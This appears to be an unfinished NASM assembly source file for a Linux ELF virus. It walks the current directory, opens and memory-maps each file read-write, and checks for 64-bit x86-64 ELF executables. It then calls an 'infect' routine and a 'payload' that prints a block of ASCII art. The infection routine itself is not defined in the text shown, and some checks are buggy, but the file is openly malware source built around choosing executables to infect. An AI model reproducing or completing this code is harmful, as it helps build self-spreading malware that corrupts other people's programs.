BITS 64


section .bss
	struc linuxdirent
		.d_ino:			resq 1
		.d_off:			resq 1
		.d_reclen:		resb 2
		.d_nameq:		resb 1
		.d_type:		resb 1
;		.d_padding:		resb 1
	endstruc
	
	struc file_stat
		.st_dev			resq 1	;ID of dev containing file
		.st_ino			resq 1	;inode #
		.st_mode		resq 1	;protection
		.st_nlink		resq 1	;# of hard links
		.st_uid			resq 1	;user id of owner
		.st_gid			resq 1	;group Id of owner
		.st_rdev		resq 1 	;dev ID 
		.st_size		resq 1	;total size in bytes
		.st_blksize		resq 1	; blocksize for fs i/o
		.st_blocks		resq 1	;# of 512b blocks allocated
		.st_atime		resq 1	;time of last file access
		.st_mtime		resq 1	;time of last file mod
		.st_ctime		resq 1	;time of last file status changea
	endstruc

	struc elf_ehdr
		.e_ident		resd 1		; unsigned char
		.ei_class		resb 1		; 
		.ei_data		resb 1		; 
		.ei_version		resb 1		; 
		.ei_osabi		resb 1		; 
		.ei_abiversion	resb 1		; 
		.ei_padding		resb 6		; bytes 10-15
		.e_type			resb 2		; uint16_t, bytes 16-17
		.e_machine		resb 2		; uint16_t, bytes 18-19
		.e_version		resw 1		; uint32_t
		.e_entry		resq 1		; ElfN_Addr
        .e_phoff		resq 1		; ElfN_Off 
        .e_shoff		resq 1		; ElfN_Off 
        .e_flags		resw 1		; uint32_t 
        .e_ehsize		resb 2		; uint16_t 
        .e_phentsize	resb 2		; uint16_t 
        .e_phnum		resb 2		; uint16_t 
        .e_shentsize	resb 2		; uint16_t 
        .e_shnum		resb 2		; uint16_t 
        .e_shstrndx		resb 2		; uint16_t 
	endstruc

	struc elf_phdr
		.p_type			resw 1		;  uint32_t   
		.p_flags		resw 1		;  uint32_t   
		.p_offset		resq 1		;  Elf64_Off  
		.p_vaddr		resq 1		;  Elf64_Addr 
		.p_paddr		resq 1		;  Elf64_Addr 
		.p_filesz		resq 1		;  uint64_t   
		.p_memsz		resq 1		;  uint64_t   
		.p_align		resq 1		;  uint64_t   
	endstruc

	struc elf_shdr
    	.sh_name		resw 1		; uint32_t   
    	.sh_type		resw 1		; uint32_t   
    	.sh_flags		resq 1		; uint64_t   
    	.sh_addr		resq 1		; Elf64_Addr 
     	.sh_offset		resq 1		; Elf64_Off  
     	.sh_size		resq 1		; uint64_t   
     	.sh_link		resw 1		; uint32_t   
     	.sh_info		resw 1		; uint32_t   
     	.sh_addralign	resq 1		; uint64_t   
     	.sh_entsize		resq 1		; uint64_t   
	endstruc



	;root_dirent: resb linuxdirent_size



section .data

;x64 syscall reference

SYS_READ 		equ 0x0
SYS_WRITE 		equ 0x1
SYS_OPEN 		equ 0x2
SYS_CLOSE 		equ 0x3
SYS_FSTAT 		equ 0x5
SYS_MMAP 		equ 0x9
SYS_MUNMAP		equ 0xB
SYS_PREAD64 	equ 0x11
SYS_PWRITE64 	equ 0x12
SYS_EXIT		equ 0x3c
SYS_GETDENTS64	equ 0x4e
SYS_CREAT		equ 0x55


PAGESIZE equ 4096	


teststr db 'boo', 13,10,0
teststrlen equ $-teststr

targetdir db '.',0
targetdirlen equ $-targetdir


;****************************************************************************************
; debug strings
;
;****************************************************************************************

checkelfpass db 'File is an ELF!', 13, 10, 0
checkelfpasslen equ $-checkelfpass

checkelffail db 'File is not an ELF!', 13, 10, 0
checkelffaillen equ $-checkelffail

checkfile_dtreg_fail db 'File is not a DTREG file!', 13, 10, 0
checkfiledtreg_fail_len equ $-checkfile_dtreg_fail

checkelf_etype_fail db 'e_type is not DYN or EXEC... boo :( ', 13, 10, 0
checkelf_etype_faillen equ $-checkelf_etype_fail

check64pass db 'File is an ELFCLASS64!', 13, 10, 0
check64passlen equ $-check64pass
check64fail db 'File is not an ELFCLASS64 booo :( going to next one', 13, 10, 0
check64faillen equ $-check64fail

checkarchpass db 'File is compiled for x86-64!', 13, 10, 0
checkarchpasslen equ $-checkarchpass
checkarchfail db 'File is not compiled for x86-64 booo :( going to next one', 13, 10, 0
checkarchfaillen equ $-checkarchfail

checkphdrstart db 'Beginning of phdr_loop', 13,10,0
checkphdrstartlen equ $-checkphdrstart

checkptloadpass db 'Segment is PT_LOAD!', 13, 10, 0
checkptloadpasslen equ $-checkptloadpass
checkptloadfail db 'Segment is not PT_LOAD :( going to next one', 13, 10, 0
checkptloadfaillen equ $-checkptloadfail

;****************************************************************************************

elf_header: times 4 dq 0
file_stat_temp: times 13 dq 0

evaddr: dq 0

oshoff: dq 0

vxhostentry: dq 0
vxoffset: dq 0

ventry equ $_start 

fd:	dq 0
fdlen equ $-fd
;framebuffer:
;	db `//dev//fb0`,0
;framebuflen equ $-framebuffer
;;
STDOUT			equ 0x1


;open() syscall parameter reference 
OPEN_RDWR		equ 0x2
O_WRONLY		equ 0x1
O_RDONLY		equ 0x0


O_CREAT			equ 100o
O_TRUNC			equ 1000o
O_APPEND		equ 2000o

S_IFREG    		dq 0x0100000   ;regular file
S_IFMT 			dq 0x0170000

;mode 		dd 0
;S_ISREG		equ (mode & S_IFMT)
;;%define S_ISREG(x)	(x&S_IFMT==S_IFREG)
;%define S_ISREG(x)	x & S_IFMT
;;see: https://stackoverflow.com/questions/40163270/what-is-s-isreg-and-what-does-it-do#:~:text=S_ISREG()%20is%20a%20macro,stat)%20is%20a%20regular%20file


PROT_READ		equ 0x1
PROT_WRITE		equ 0x2
MAP_PRIVATE		equ 0x2

;ELF header vals
ELFCLASS64 		equ 0x2


ETYPE_DYN		equ 0x3
ETYPE_EXEC		equ 0x2

;D_TYPE values
DT_REG 			equ 0x8


PT_LOAD 		equ 0x0100

;MAX_RDENT_BUF:	db 0x200 dup (?)
MAX_RDENT_BUF	times 0x400 db 0 
MAX_RDENT_BUF_SIZE equ 0x400

num_dir_entries resq 0x0
root_dirent:	dq 0 
;	istruc linuxdirent iend
;times 0x400 db 0 
;dw 0x200

;;file pointed to by fstat is fd
section .text
global _start
_start:
	;push rbp
	;mov rbp, rsp
	sub rsp, 0x1000
	mov r14, rsp

_getdirents:
;****************************************************************************************
; open - syscall 0x2
;;open(filename, flags, mode);
;;rdi == filename
;;rsi == flags
;rdx == mode
;; returns: fd (in rax, obv)
;****************************************************************************************
	;push "."
	;pop rdi
	mov rdi, targetdir
	xor rsi, rsi 		;no flags
	add rsi, 0x02000000
	mov rdx, O_RDONLY	;open read-only
	mov rax, SYS_OPEN
	syscall
	
	mov r9, rax						;fd into r9
;	mov [fd], rax
;****************************************************************************************
; getdents64 - syscall 0x4e
;; getdents(unsigned int fd, struct linuxdirent *dirent, unsigned int count);
;;rdi == fd
;;rsi == *dirent
;rdx == count
;returns # entries in rax
;[r14 v+ 600 +dirent] holds the pointer to the first dirent struct
;so we can iterate through all dirent entries using the size field in this dirent struc
;as an offset for successive jumps in address space	
;****************************************************************************************
	;push r9
	;pop rdi
	mov rdi, rax
	lea rsi, [r14 + 600 + linuxdirent] ;r14 + 600 is location on the stack where we'll save our dirent struct
	mov rdx, MAX_RDENT_BUF_SIZE
	mov rax, SYS_GETDENTS64
	syscall


	mov r8, rax					;# of dirent entries in r8
	mov [root_dirent], rsi
	mov qword [r14 + 500], rax		;save # of dir entries to local var on stack
;****************************************************************************************
; close - syscall 0x3
;;close(fd);
;;rdi == fd (file descriptor)
;; returns: 0 on success (-1 on error)
;****************************************************************************************
	mov rdi, r9
	mov rax, SYS_CLOSE
	syscall
	
;	lea rsi,  [r14 + 600 + linuxdirent.d_nameq]
;	lea rdi, [r14 + 200] 
;	test_copy_filename:
;		movsb
;		cmp byte [rsi], 0x0
;		jne test_copy_filename
;	lea r13, [r14 + 200]
;	call _write
	xor rcx, rcx	
	jmp check_file

;	jmp printteststr
;****************************************************************************************
; write - syscall 0x1
;;rdi == fd (file descriptor)
;;rsi == const char* buf
;rdx == count (# of bytes to write)
;; returns: 0 on success (-1 on error)
;****************************************************************************************
_write:
		;lea rsi, [r14 + 600 + linuxdirent.d_nameq]
		xor rsi, rsi
		mov rdx, r12
		mov rsi, r13
		mov rdi, STDOUT
		mov rax, SYS_WRITE
		syscall
		ret
	
printteststr:
		lea rsi, teststr
		mov rdi, STDOUT
		mov rdx, teststrlen
		mov rax, SYS_WRITE
		syscall
		jmp _restore		

;****************************************************************************************
;check_file:
;	open file -> fstat file (get file size) - > use fstat.size for mmap call & mmap file	
;	upon successful mmap, close file
;	use mmaped file for checks to confirm that the target file satisfies the following:
;	1. the target file is an executable
;	2. the target file is an ELF
;	3. the target file is a 64-bit ELF
;	4. (optional, but requirement for rn): the target file is for x86_64 arch
;	5. the target file is not already infected (check w signature at known offset)
;	*If all of the following above conditions hold, then call the infection routine
;	Otherwise, continue looping through the remaining files in the directory
;
;****************************************************************************************
check_file:
	push rcx
	;nvm d_type might not be available; use the macros for fstat instead
	;cmp byte [rcx + r14 + 600 + linuxdirent.d_type + 1], DT_REG
;	cmp byte [rcx + r14 + 600 + linuxdirent.d_type ], DT_REG
	;cmp byte [rcx + r14 + 600 + linuxdirent.d_reclen - 1], DT_REG
;	jne checknext 
	check_elf:
	;	push rcx
		lea rdi, [rcx + r14 + 600 + linuxdirent.d_nameq]	;name of file in rdi
		mov rsi, OPEN_RDWR 					;flags - read/write in rsi
		xor rdx, rdx						;mode - 0
		mov rax, SYS_OPEN
		syscall

		cmp rax, 0
		jb checknext
;		test rax, rax
;		js checknext
		
		mov r9, rax
		mov r8, rax
		mov qword [r14 + 400], rax
		mov qword [fd], rax
	;	pop rcx
		
		xor r12, r12
		lea rdi, [r14 + 200] 
		lea rsi, [rcx + r14 + 600 + linuxdirent.d_nameq]
		.copy_filename:
			movsb
			inc r12
			cmp byte [rsi], 0x0
			jne .copy_filename

		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
	;;	lea r13, [r14 + 200]
	;;	call _write
		xor rax, rax
		;mov [r14 + 500], rax				;save fd to opened file at designated spot on the stack
	
	;	push r9
	check_filename:
		cmp qword [r14+200], "."
		je checknext

	get_filestat:
		lea rsi, [r14 + file_stat]
		;lea rsi, [file_stat_temp]
		mov rdi, r8
		;mov rdi, [fd]
		mov rax, SYS_FSTAT
		syscall
	
		;tbqf extracting this field and checking it is an infuriating piece of logic that is not working as expected
		; since this is so annoying, I'm skipping this check for rn
	
		;mov r12, checkfiledtreg_fail_len
		;lea r13, checkfile_dtreg_fail
		
		;mov r10, [r14 + file_stat.st_mode]
		;mov [mode], r10
		;mov r10, S_ISREG(r10)
		;cmp S_ISREG, S_IFREG	
		;cmp r10, 0x1
		;mov rax, [r14+file_stat.st_mode]
		;and r10, [S_IFMT]
		;mov r9, [S_IFREG]
		;cmp r10, r9
		
		
		;jne checknext
		
		;void *mmap(void addr[.length], size_t length, int prot, int flags,
		;                  int fd, off_t offset);
	mmap_file:
		xor rdi, rdi			;set RDI to NULL
		mov qword rsi, [r14 + file_stat.st_size]
		;mov qword rsi, [file_stat_temp + 56]
		;mov rsi, [file_stat_temp + 56]
		mov rdx, 0x3 			; (PROT_READ | PROT_WRITE)
		mov r10, MAP_PRIVATE
		;mov r8, r9
		;mov r8, fd				;fd is already in r8 so this mov is unnecessary
		xor r9, r9				;offset of 0 within file == start of file, obv	
		mov rax, SYS_MMAP
		syscall
		
		cmp rax, 0
		jb checknext
	
		mov r8, rax
		;mov [r14 + 800 + elf_ehdr], rax			;rax contains address of new mapping upon return from syscall
		mov [r14 + 800], rax			;rax contains address of new mapping upon return from syscall
	;	pop r9
		push rax
	;read_elf_header:
		;mov rdi, [fd]
	;	mov rdi, r9
	;	lea rsi, [elf_header]
	;	mov rdx, 64
	;	xor r10, r10
	;	mov rax, SYS_PREAD64
	;	syscall

	close_curr_file:
		;mov rdi, [r14+400]
		mov rdi, r9
		mov rax, SYS_CLOSE
		syscall
	
		pop rax
		test rax, rax
		;cmp rax, 0
		js checknext
		;test rax, rax
		;js checknext
	check_elf_header_etype:
		lea r13, checkelf_etype_fail
		mov r12, checkelf_etype_faillen
		cmp word [rax + elf_ehdr.e_type], 0x0200
		je check_elf_header_magic_bytes
		cmp word [rax + elf_ehdr.e_type], 0x0300
		je check_elf_header_magic_bytes
		jnz checknext

	check_elf_header_magic_bytes:
		lea r13, checkelffail
		mov r12, checkelffaillen
		;cmp dword [r14 + 800 + elf_ehdr.e_ident], 0x464c457f
		;cmp dword [r8 + elf_ehdr.e_ident], 0x464c457f
		cmp dword [rax + elf_ehdr.e_ident], 0x464c457f
	
		;lea rax, elf_header
		;cmp dword [rax], 0x464c457f
		;cmp dword [elf_header], 0x464c457f
		jnz checknext
		
		;;lea r13, checkelfpass
		;;mov r12, checkelfpasslen
		;;call _write
	check_elf_header_64bit:
		;cmp dword [r14+800+elf_ehdr.e_ident+4], ELFCLASS64
		lea r13, check64fail
		mov r12, check64faillen
		;cmp byte [elf_header+4], ELFCLASS64
		cmp byte [rax + elf_ehdr+4], ELFCLASS64
		jne checknext
		
		;;lea r13, check64pass
		;;mov r12, check64passlen
		;;call _write
;		jmp _restore
	
	check_elf_header_arch:
		lea r13, checkarchfail
		mov r12, checkarchfaillen
		;cmp byte [elf_header+18], 0x3e
		cmp byte [rax + elf_ehdr +18], 0x3e
		jne checknext
		
		;;lea r13, checkarchpass
		;;mov r12, checkarchpasslen
		;;call _write
		;jmp _restore
		
	ready2infect:
		;push rax
		call infect	
		jmp painting



	checknext:
		;mov r12, checkfiledtreg_fail_len
		;lea r13, checkfile_dtreg_fail
		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
		call _write
		pop rcx
		add cx, [rcx + r14 + 600 + linuxdirent.d_reclen]
		cmp qword rcx, [r14 + 500]
		jne check_file
		jmp _restore




	painting:
	call payload
		db 0x2a,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a,0x25
		db 0xa,0x50,0x50,0x50,0x50,0x50,0x50,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a
		db 0x2a,0xa,0x50,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x50,0x50,0x50,0x50,0x50,0x50,0x2a
		db 0x2a,0x2a,0xa,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x24,0x59,0x59,0x59,0x59,0x2b,0x2b,0x2b,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x50,0x50
		db 0x50,0x50,0x50,0xa,0x2b,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x24,0x24,0x24,0x24,0x59,0x59,0x2b,0x50,0x50,0x50,0x2b,0x2b,0x59,0x24,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0x2b,0x2b,0x2b
		db 0x2b,0x2b,0x50,0x50,0xa,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x50,0x2a,0x50,0x2b,0x2b,0x2b,0x59,0x24,0x24,0x24,0x24,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x2b
		db 0x2b,0x2b,0x2b,0x2b,0x2b,0xa,0x59,0x59,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x50,0x50,0x50,0x50,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x59,0x59,0x59
		db 0x59,0x59,0x59,0x59,0x2b,0x2b,0xa,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x2b,0x50,0x50,0x2b,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24
		db 0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0xa,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x2c,0x2c,0x24,0x24,0x2c,0x24,0x2b,0x2b,0x59,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24
		db 0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x59,0xa,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x24,0x2a,0x2b,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24
		db 0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0xa,0x24,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x59,0x24,0x2c,0x2a,0x2a,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x2b,0x25,0x50,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x59,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x59,0x2c,0x2c,0x2a,0x2a,0x2b,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x59,0x59,0x24,0x24,0x2c,0x24,0x24,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2a,0x50,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x59,0x2b,0x59,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x59,0x2c,0x2c,0x25,0x2a,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2b,0x2b,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x24,0x2c,0x24,0x50,0x2b,0x59,0x59,0x24,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2c,0x24,0x2b,0x2b,0x59,0x24,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x2c,0x24,0x24,0x2b,0x59,0x24,0x2c,0x24,0x59,0x59,0x24,0x24,0x24,0x24,0x2b,0x24,0x2c,0x2c,0x2c,0x24,0x59,0x59,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x24,0x2a,0x25,0x44,0x44,0x2a,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2b,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x2c,0x24,0x24,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x59,0x2b,0x44,0x25,0x25,0x2a,0x2a,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x2b,0x50,0x2b,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x50,0x25,0x25,0x50,0x2b,0x24,0x2c,0x24,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2b,0x50,0x2b,0x59,0x24,0x59,0x50,0x59,0x2c,0x2c,0x2c,0x59
		db 0x59,0x50,0x24,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2c,0x2c,0x24,0x24,0x24,0x24,0x59,0x24,0x2c,0x2c,0x2c,0x24,0x2c,0x2e,0x2c,0x59,0x2b,0x2c,0x2c,0x2c,0x24,0x2b,0x50,0x24,0x2c,0x2b,0x24,0x24,0x2c,0x2c,0x59,0x50,0x2b,0x59
		db 0x2b,0x2b,0x24,0x24,0x24,0x2c,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2c,0x24,0x24,0x2c,0x2c,0x59,0x2c,0x2e,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x59,0x2a,0x2b,0x24,0x59,0x2b,0x59,0x59,0x24,0x24,0x24,0x59
		db 0x59,0x24,0x24,0x24,0x24,0x59,0x2c,0x2e,0x2c,0x24,0x59,0x59,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2e,0x2c,0x59,0x59,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x2a,0x2a,0x59,0x2c,0x2e,0x2e,0x2e,0x2c,0x2e,0x2c,0x24,0x59,0x50,0x2b,0x59,0x50,0x50,0x50,0x2b,0x50,0x2b
		db 0x59,0x24,0x59,0x2b,0x2a,0x50,0x50,0x59,0x2c,0x2e,0x2c,0x2c,0x24,0x2b,0x2b,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2e,0x2c,0x59,0x59,0x2e,0x2e,0x2c,0x24,0x2c,0x2c,0x2c,0x2a,0x2a,0x2a,0x50,0x24,0x2c,0x2c,0x2c,0x2c,0x2e,0x2c,0x2c,0x24,0x2c,0x2c,0x24,0x24,0x24,0x24,0x59
		db 0x2a,0x2a,0x2a,0x50,0x59,0x59,0x59,0x24,0x24,0x24,0x2c,0x2e,0x2c,0x2c,0x24,0x59,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2e,0x2e,0x2e,0x2e,0x2e,0x24,0x59,0x24,0x24,0x2c,0x2c,0x2c,0x2e,0x2c,0x2b,0x50,0x2a,0x4a,0x44,0x25,0x2a,0x2a,0x50,0x50,0x2b,0x50,0x50,0x24,0x2c,0x24,0x24,0x2c,0x2c
		db 0x24,0x2b,0x2b,0x2b,0x24,0x2c,0x2e,0x2e,0x2c,0x2c,0x59,0x2c,0x2e,0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2e,0x2e,0x2e,0x2e,0x2c,0x2c,0x24,0x59,0x2c,0x2e,0x2e,0x2e,0x2e,0x24,0x2b,0x2b,0x2a,0x2a,0x2a,0x50,0x50,0x2b,0x2b,0x2b,0x2b,0x59,0x2c,0x24,0x24,0x59,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x24,0x2e,0x2e,0x2e,0x2c,0x24,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2e,0x2e,0x2e,0x2e,0x2e,0x2c,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2e,0x2e,0x2e,0x2e,0x2e,0x2c,0x24,0x2e,0x2e
		db 0x2e,0x2e,0x2e,0x2e,0x2e,0x24,0x2c,0x2c,0x24,0x2c,0x2e,0x2e,0x2c,0x59,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2e,0x2e,0x2c,0x2c,0x24,0x2b,0x2a,0x50,0x2b,0x50,0x2b,0x2b,0x2b,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x2c,0x24,0x2c,0x24,0x59,0x24,0x2e
		db 0x2e,0x2e,0x2e,0x2e,0x2c,0x2c,0x2c,0x2e,0x2c,0x59,0x59,0x59,0x24,0x2c,0x2c,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2e,0x2c,0x59,0x2b,0x50,0x50,0x50,0x50,0x2b,0x2a,0x50,0x2b,0x59,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x24,0x24,0x2c
